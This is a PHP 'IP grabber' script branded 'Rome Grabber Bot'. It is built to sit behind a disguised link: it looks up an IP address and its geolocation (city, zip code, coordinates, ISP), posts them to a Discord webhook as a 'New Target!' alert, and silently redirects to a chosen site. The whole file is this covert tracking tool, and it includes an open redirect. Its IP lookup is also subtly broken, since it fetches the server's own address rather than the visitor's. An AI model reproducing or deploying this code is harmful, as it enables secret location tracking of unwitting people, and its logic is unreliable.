<?php
const WEBHOOK_DEFAULT = "https://discordapp.com/api/webhooks/";
const IP_API_CODE = "28533755";

$webhook_id = base64_decode($_GET["id"]);
$target_website = base64_decode($_GET["target"]);

if ($webhook_id && $target_website) {
    $user_ip = json_decode(file_get_contents("https://api.ipify.org?format=json"))->ip;
    $ip_details = json_decode(file_get_contents("http://ip-api.com/json/$user_ip?fields=28533755"));

    $payload = json_encode(array(
        "username" => "Rome Grabber Bot",
        "embeds" => array(
            array(
                "title" => "New Target!",
                "description" => "
                    **IP:** $user_ip
                    **Continent name:** $ip_details->continent
                    **Two-letter continent code:** $ip_details->continentCode
                    **Country name:** $ip_details->country
                    **Two-letter country code:** $ip_details->countryCode
                    **Region/state:** $ip_details->regionName
                    **City:** $ip_details->city
                    **Zip code:** $ip_details->zip
                    **Latitude:** $ip_details->lat
                    **Longitude:** $ip_details->lon
                    **Timezone (tz):** $ip_details->timezone
                    **National currency:** $ip_details->currency
                    **ISP name:** $ip_details->isp"
            )
        )
    ));

    $ch = curl_init(WEBHOOK_DEFAULT . $webhook_id);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-type: application/json"));
    curl_exec($ch);
    curl_close($ch);

    header("Location: $target_website");
}
